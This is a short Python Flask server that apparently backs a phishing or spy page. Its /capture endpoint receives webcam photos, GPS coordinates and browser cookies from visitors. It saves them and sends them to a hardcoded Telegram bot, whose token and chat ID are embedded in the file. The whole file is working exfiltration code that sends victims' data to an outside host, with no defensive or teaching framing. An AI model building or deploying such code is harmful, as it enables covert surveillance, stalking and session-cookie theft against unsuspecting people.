from flask import Flask, render_template, request, jsonify
import base64
import os
import requests
from datetime import datetime
import threading

app = Flask(__name__)
UPLOAD_FOLDER = 'captures'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# Telegram Configuration
TELEGRAM_BOT_TOKEN = "8325078601:AAEuzsBmH7dxbTSweJuWDtTO5gbR1DyrD8o"
TELEGRAM_CHAT_ID = "1208908312"

def send_to_telegram(image_path, location_data, cookie_path):
    try:
        # Send Location
        if location_data:
            lat = location_data.get('latitude')
            lon = location_data.get('longitude')
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
            message = f"📍 New Capture!\nLocation: {lat}, {lon}\nMap: {maps_link}"
            
            requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", params={
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message
            })

        # Send Photo
        if image_path and os.path.exists(image_path):
            with open(image_path, 'rb') as photo:
                requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
                    data={'chat_id': TELEGRAM_CHAT_ID},
                    files={'photo': photo}
                )

        # Send Cookies
        if cookie_path and os.path.exists(cookie_path):
            with open(cookie_path, 'rb') as cookies:
                requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
                    data={'chat_id': TELEGRAM_CHAT_ID, 'caption': '🍪 captured_cookies.txt'},
                    files={'document': cookies}
                )
                
        print("Sent to Telegram successfully.")
    except Exception as e:
        print(f"Failed to send to Telegram: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    image_data = data.get('image')
    location = data.get('location')
    cookies = data.get('cookies')
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    image_path = None
    cookie_path = None
    
    # Save Image
    if image_data:
        try:
            image_data = image_data.split(",")[1]
            image_path = f"{UPLOAD_FOLDER}/img_{timestamp}.png"
            with open(image_path, "wb") as f:
                f.write(base64.b64decode(image_data))
        except Exception as e:
            print(f"Error saving image: {e}")
            
    # Save Location
    if location:
        try:
            with open(f"{UPLOAD_FOLDER}/loc_{timestamp}.txt", "w") as f:
                f.write(f"Latitude: {location.get('latitude')}\n")
                f.write(f"Longitude: {location.get('longitude')}\n")
        except Exception as e:
            print(f"Error saving location: {e}")

    # Save Cookies
    cookie_path = f"{UPLOAD_FOLDER}/cookies_{timestamp}.txt"
    try:
        content = cookies if cookies else "No cookies found."
        print(f"DEBUG: Received cookies: '{cookies}'") # Debug print
        with open(cookie_path, "w") as f:
            f.write(content)
    except Exception as e:
        print(f"Error saving cookies: {e}")
            
    # Send to Telegram in background
    # Always try to send if we have any data file or location
    if image_path or location or cookie_path:
        threading.Thread(target=send_to_telegram, args=(image_path, location, cookie_path)).start()
            
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(debug=True, port=5000)
